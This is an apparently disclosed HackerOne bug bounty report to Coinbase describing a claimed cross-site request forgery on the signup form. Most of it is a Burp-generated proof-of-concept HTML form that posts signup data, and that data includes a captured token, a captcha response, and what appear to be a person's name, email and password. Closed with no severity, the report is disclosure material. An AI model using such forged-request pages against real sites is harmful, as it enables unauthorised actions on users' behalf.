# Csrf bug on signup session

## Report Details
- **Report ID**: 230428
- **URL**: https://hackerone.com/reports/230428
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2017-05-21T09:46:51.165Z
- **Disclosed**: 2017-08-30T22:51:21.465Z

## Reporter
- **Username**: dark_heaven
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: coinbase

## Vulnerability Information
> NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, researchers are more likely to earn a larger bounty by explaining how a vulnerability can be exploited to cause harm to Coinbase or its users.

**Summary:** [CSRF bug on coinbase]
**Description:** [Sir In signup session I intercept using burpsuite professional. Then i make CSRF POC I I test this on by browser. I change data to check actually it's working or not. It's actually send request to my mail for verify email address. CSRF POC is below:-
-----------------------------------------------------------------------------------------------------------------------------------------------------------
 <html>
  <body>
    <form action="https://www.coinbase.com/users" method="POST">
      <input type="hidden" name="utf8" value="â&#156;&#147;" />
      <input type="hidden" name="authenticity&#95;token" value="nCesx4OwNXcQRUR&#47;0YIGDaBMFThkj3FbZjHOeV2ANvRXTBjnUjDb30otf7hsjKO&#47;vItsb0MupYvyRr1fIs77Ow&#61;&#61;" />
      <input type="hidden" name="user&#91;first&#95;name&#93;" value="anirban" />
      <input type="hidden" name="user&#91;last&#95;name&#93;" value="singha" />
      <input type="hidden" name="user&#91;email&#93;" value="anirbansingha1&#64;gmail&#46;com" />
      <input type="hidden" name="user&#91;password&#93;" value="dadaboji" />
      <input type="hidden" name="g&#45;recaptcha&#45;response" value="03AIezHSYALkPQNKFq&#95;8LadLUQyLi0eBef4aNZ2UCyfLtGE95EW77m&#45;uAvI25VAVb839olRqXfMsqjAEn5eANLARw4sw6vKlJ&#45;u0qDQ1j&#95;aqZ&#95;RnDi38AokPkKhypKvoY1P7T7TMZkVzfBgsXPXC0&#45;LXSXQW6UyfvZ&#95;W8LSo1YfgrAtD5EZI5TtG5Qao47ylsASetNKhtS7OloBmliEVFS46n6jHcGT8zPN1XI4y8vkXto5pueuQQ3ZDFM3kX24GLEvge&#95;ZJ2RGIyxRkqDDgQ1buPjQLsCtoHwF8twDDGV0qETHUh6npihSfRMyPJxRsZAhfBW0MfKHcxAF0LkmaTOP0k11xpfxZIsyUW4sx190TR&#45;mcHfFfzxXkCG32DmYha1rR6JyFLeyusiX8S2AHCEalVeWIKuE&#45;XdQE0vIskTChcF0K6XPJPX2sU" />
      <input type="hidden" name="user&#91;accepted&#95;user&#95;agreement&#93;" value="0" />
      <input type="hidden" name="user&#91;accepted&#95;user&#95;agreement&#93;" value="1" />
      <input type="hidden" name="commit" value="Create&#32;account" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
----------------------------------------------------------------------------------------------------------------------------------------------------------
]

## Browsers Verified In:

  * [firefox 45.9.0]
  * [add each browser and version number tested in]

## Steps To Reproduce:

(Add details for how we can reproduce the issue)

  1. [intercept  a request using burpsuite after pressing signup button]
  1. [make a CSRF prove of concept using burpsuite]
  1. [Change data and test in browser. It will work compleately fine]

## Supporting Material/References:

  * List any additional material (e.g. screenshots, logs, etc.)


## Attachments
No attachments
